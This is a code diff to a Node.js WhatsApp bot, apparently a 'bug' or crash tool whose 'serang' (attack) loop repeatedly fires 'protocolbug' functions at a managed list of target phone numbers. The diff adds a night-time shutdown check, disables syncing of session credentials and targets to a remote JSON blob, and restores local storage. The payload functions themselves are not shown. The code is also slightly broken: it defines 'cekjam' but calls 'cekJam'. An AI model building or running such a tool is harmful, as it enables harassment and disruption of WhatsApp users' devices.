@@ -328,9 +328,18 @@ function trashprotocol(target) {
   });
 }
 
+function cekjam() {
+  const jam = new Date().getHours();
+  const menit = new Date().getMinutes();
+  if (jam > 21 || jam < 5 || (jam >= 21 && menit >= 45) || (jam <= 5 && menit <= 15)) {
+    process.exit();
+  }
+}
+
 function serang(targets) {
   return new Promise(async resolve => {
     for (let i = 1; i <= 35; i++) {
+      cekjam();
       await protocolbug5(targets);
       await tunggu(1500);
       await protocolbug3(targets);
@@ -356,8 +365,10 @@ function updateData() {
     headers: { Accept: "application/json", "Content-Type": "application/json" }
   });
 }
+
 let exec;
 async function start() {
+  cekJam();
   const jam = new Date().getHours();
   const targets = blob.targets;
   const arrX = blob.targets.toString();
@@ -377,7 +388,7 @@ async function start() {
   if (arr.length > 0) {
     blob.waktu = new Date().getTime() + 60000 * 6.5;
     blob.targets = arr;
-    await updateData();
+    // await updateData();
     fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
 
     arr = arr.map(elem => elem.split("@")[0] + "@s.whatsapp.net");
@@ -389,12 +400,12 @@ async function start() {
 async function olahTarget(aksi, target, send) {
   if (aksi == "add") {
     blob.targets.push(target);
-    await updateData();
+    // await updateData();
     fs.writeFileSync("./data.json", JSON.stringify(blob), "utf-8");
     send(nomorRequest + "@s.whatsapp.net", { text: "add OK" });
   } else if (aksi == "del") {
     blob.targets.splice(blob.targets.indexOf(target), 1);
-    await updateData();
+    // await updateData();
     fs.writeFileSync("./data.json", JSON.stringify(blob), "utf-8");
     send(nomorRequest + "@s.whatsapp.net", { text: "del OK" });
   } else if (aksi == "all") {
@@ -421,13 +432,14 @@ const reviveBuffer = obj => {
 let pairing;
 let wait;
 async function bot(session) {
+  cekJam();
   wait = setTimeout(() => {
     process.exit();
   }, 60000);
 
   if (!session) {
     const { state } = await useMultiFileAuthState("session");
-    await fetch("https://jsonblob.com/api/jsonBlob/1389135762926264320", {
+    /*await fetch("https://jsonblob.com/api/jsonBlob/1389135762926264320", {
       headers: { Accept: "application/json", "Content-Type": "application/json" }
     })
       .then(r => r.json())
@@ -441,18 +453,18 @@ async function bot(session) {
         } else {
           session = state;
         }
-      });
+      });*/
 
-    /* blob = JSON.parse(fs.readFileSync("./data.json", "utf-8"));
-    if(blob.session.creds){
-    nomorRequest = blob.session.creds.me.id.split(":")[0];
-    session = reviveBuffer(blob.session);
-    const { state } = await useMultiFileAuthState("sessionX");
-    session.keys.get = state.keys.get;
-    session.keys.set = state.keys.set;
-    }else{
-      session=state;
-      }*/
+    blob = JSON.parse(fs.readFileSync("./data.json", "utf-8"));
+    if (blob.session.creds) {
+      nomorRequest = blob.session.creds.me.id.split(":")[0];
+      session = reviveBuffer(blob.session);
+      const { state } = await useMultiFileAuthState("sessionX");
+      session.keys.get = state.keys.get;
+      session.keys.set = state.keys.set;
+    } else {
+      session = state;
+    }
   }
 
   const { version } = await fetchLatestBaileysVersion();
@@ -490,7 +502,7 @@ async function bot(session) {
         if (statusCode === 401 && error === "Unauthorized") {
           console.log("Unauthorized 401");
           blob.session = {};
-          await updateData();
+          // await updateData();
           fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
           return bot();
         }
@@ -517,11 +529,12 @@ async function bot(session) {
 
   sock.ev.on("creds.update", async () => {
     blob.session = sock.authState;
-    await updateData();
+    // await updateData();
     fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
   });
 
   sock.ev.on("messages.upsert", ({ messages }) => {
+    cekJam();
     if (fs.readdirSync("./").indexOf("session") >= 0) {
       fs.rmSync("./session/", { recursive: true });
     }
